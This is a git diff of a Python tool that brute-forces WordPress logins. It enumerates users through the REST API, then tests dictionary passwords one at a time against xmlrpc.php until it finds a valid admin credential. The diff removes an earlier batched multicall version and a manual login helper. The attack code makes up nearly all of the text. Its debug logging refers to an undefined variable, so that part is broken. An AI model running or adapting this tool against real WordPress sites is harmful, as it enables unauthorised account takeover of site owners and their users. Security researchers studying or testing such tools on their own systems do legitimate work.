@@ -13,6 +13,7 @@ import utils
 from utils import die, dump
 from configuration import getConf
 import glob
+import time
 
 
 # Remove unnesseray warning related to certificate
@@ -84,35 +85,6 @@ class BruteForcer:
         return True
     
 
-    def simulate_login(self):
-        login_url = f"{self.domain.rstrip('/')}/wp-login.php"
-    
-        username = input("Username for login test: ")
-        password = input("Password for login test: ")
-    
-        payload = {
-            'log': username,
-            'pwd': password,
-            'wp-submit': 'Log In',
-            'redirect_to': f"{self.domain}/wp-admin/",
-            'testcookie': '1'
-        }
-    
-        headers = {
-            'User-Agent': 'Mozilla/5.0',
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }
-    
-        try:
-            response = requests.post(login_url, data=payload, headers=headers, timeout=5)
-            print(f"\n[POST] {login_url}")
-            print(f"Status Code: {response.status_code}")
-            print(f"Response Length: {len(response.text)}")
-            print(f"Headers: {response.headers}")
-        except requests.exceptions.RequestException as e:
-            print(f"[ERROR] POST request failed: {e}")
-    
-
     # Returns the list of users of the given website, interrogating the WP rest API.
     def get_user_list(self):
         url = f"{self.domain}/wp-json/wp/v2/users"
@@ -161,6 +133,7 @@ class BruteForcer:
             die()
 
         # We read the available dictionnaries
+        time_start = time.time()
         for file_path in files:
             print(f"Reading {file_path}")
             
@@ -173,167 +146,68 @@ class BruteForcer:
                     word = line.strip()
                     if word:
                         # we test the password
+                        found = self.testPassword(username, word)
                         passwords_tested = passwords_tested + 1
 
-                        # test passwords 5 by 5
-                        if len(passwords_set) == 5:
-                            found = self.testPasswords(username, passwords_set)
-                            passwords_set = []
-                        else:
-                            passwords_set.append(word)
-
                     # Some logging...
+                    if time.time() - time_start >= 3:
+                        print('.')
+                        time_start = time.time()
+
                     if passwords_tested % 50 == 0:
                         print(f"Tested {passwords_tested} passwords so far")
-
-            # If password was not found and there is some passwords left untested because 
-            # the total number of passwords is not a multiple of 5, we perform the check on these
-            if found == False and len(passwords_set) != 0:
-                found = self.testPasswords(username, passwords_set)
                 
 
     # Usus xmlrpc to check if a given password works for a given user.
     # BTW, Wordpress has a python library: xmlrpc.client but FI
-    def testPasswords(self, username, passwords):
-        url_xmlrpc = f"{self.domain}/xmlrpc.php"
-
-        for password in passwords:
-            
-            # Build XML-RPC payload
-            request_body = f"""
-            <?xml version="1.0" encoding="UTF-8"?>
-            <methodCall>
-                <methodName>wp.getUsersBlogs</methodName>
-                <params>
-                    <param>
-                        <value><string>{username}</string></value>
-                    </param>
-                    <param>
-                        <value><string>{password}</string></value>
-                    </param>
-                </params>
-            </methodCall>
-            """
-
-            response = requests.post(
-                url_xmlrpc,
-                data=request_body.strip(),
-                headers={'Content-Type': 'text/xml'},
-                timeout=5,
-                verify=self.verify
-            )
-
-            # Log the reponses
-            if getConf('dev.debugmode') == True:
-                with open("log/requests.log", "a", encoding="utf-8") as file:
-                    file.write("Results for passwords:"+' '.join(passwords)+"\n")
-                    file.write("<=============== REQUEST BODY ===============>\n")
-                    file.write(f"{request_body}\n")
-                    file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
-                    file.write(response.text)
-                    file.write("<=============== END RESPONSE BODY ===============>\n\n\n")
-
-            # TODO: better handling. Ideally wait and retry but FI.
-            if response.status_code != 200:
-                return False
-
-            if '<name>isAdmin</name>' in response.text:
-                print(f"✅ SUCCESS → The password '{password}' is valid for the user '{username}' !")
-                die()
-
-        return False
-        
-
-    # return the password of a given username if found.
-    # Must pass a set of passwords to make best use of xmlrpc's system.multicall feature
-    # NOTE: DOES NOT WORK LOL because the behaviour of Wordpress using system.multicall is 
+    # NOTE: cannot use system.multicall because the behaviour of Wordpress using system.multicall is 
     # "quirky" since if the first authentication in the stack fails, wordpress assumes it will fail for the rest of the stack!
     # which mean litteraly: if 1st test is false then all batch is false QQ
     # So we must perform an authentication one by one.
-    def testPasswords_using_multicall(self, username, passwords):
+    def testPassword(self, username, password):
         url_xmlrpc = f"{self.domain}/xmlrpc.php"
-        
+
         # Build XML-RPC payload
-        # xmlrpc allows multiple executions at once, which we want to use to save our time
-        request_body = """<?xml version="1.0"?><methodCall>
-        <methodName>system.multicall</methodName><params><param><value><array><data>\n\n"""
+        request_body = f"""
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+            <methodName>wp.getUsersBlogs</methodName>
+            <params>
+                <param>
+                    <value><string>{username}</string></value>
+                </param>
+                <param>
+                    <value><string>{password}</string></value>
+                </param>
+            </params>
+        </methodCall>
+        """
 
-        for password in passwords:
-            request_body = request_body + f"""
-                <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array>
-                    <data>
-                        <value>
-                            <string>{username}</string>
-                        </value>
-                        <value>
-                            <string>{password}</string>
-                        </value>
-                    </data>
-                </array></value></data></array></value></member></struct></value>\n"""
+        response = requests.post(
+            url_xmlrpc,
+            data=request_body.strip(),
+            headers={'Content-Type': 'text/xml'},
+            timeout=5,
+            verify=self.verify
+        )
 
-        request_body = request_body + """</data></array></value></param></params></methodCall>\n\n"""
+        # Log the reponses
+        if getConf('dev.debugmode') == True:
+            with open("log/requests.log", "a", encoding="utf-8") as file:
+                file.write("Results for passwords:"+' '.join(passwords)+"\n")
+                file.write("<=============== REQUEST BODY ===============>\n")
+                file.write(f"{request_body}\n")
+                file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
+                file.write(response.text)
+                file.write("<=============== END RESPONSE BODY ===============>\n\n\n")
 
-        try:
-            response = requests.post(
-                url_xmlrpc,
-                data=request_body.strip(),
-                headers={'Content-Type': 'text/xml'},
-                timeout=5,
-                verify=self.verify
-            )
+        # TODO: better handling. Ideally wait and retry but FI.
+        if response.status_code != 200:
+            return False
 
-            # Log the reponses
-            if getConf('dev.debugmode') == True:
-                with open("log/requests.log", "a", encoding="utf-8") as file:
-                    file.write("Results for passwords:"+' '.join(passwords)+"\n")
-                    file.write("<=============== REQUEST BODY ===============>\n")
-                    file.write(f"{request_body}\n")
-                    file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
-                    file.write(response.text+"\n")
-                    file.write("<=============== END RESPONSE BODY ===============>\n\n\n")
-
-            # TODO: better handling. Ideally wait and retry but FI.
-            if response.status_code != 200:
-                return False
-
-            # We look for the string '<name>isAdmin</name>', which means an admin 
-            # account have been found since the other accounts do not mention their status
-            # We just need to check the passwords one by one to determine what is the right one in our set
-            if '<name>isAdmin</name>' in response.text:
-
-                print(f"Hey!! A password is valid in the set!")
-
-                for password in passwords:
-                    request_body = f"""
-                    <?xml version="1.0" encoding="UTF-8"?>
-                    <methodCall>
-                        <methodName>wp.getUsersBlogs</methodName>
-                        <params>
-                            <param>
-                                <value><string>{username}</string></value>
-                            </param>
-                            <param>
-                                <value><string>{password}</string></value>
-                            </param>
-                        </params>
-                    </methodCall>
-                    """
-
-                    response = requests.post(
-                        url_xmlrpc,
-                        data=request_body.strip(),
-                        headers={'Content-Type': 'text/xml'},
-                        timeout=5,
-                        verify=self.verify
-                    )
-
-                    if '<name>isAdmin</name>' in response.text:
-                        print(f"✅ SUCCESS → Username: '{username}', Password: '{password}'")
-                        return password  # Or break if you only want one valid result
-
-        except requests.exceptions.RequestException as e:
-            print(f"[ERROR] While testing '{password}': {e}")
-            # Do not return; just continue trying other passwords
+        if '<name>isAdmin</name>' in response.text:
+            print(f"✅ SUCCESS → The password '{password}' is valid for the user '{username}' !")
+            die()
 
         return False
         
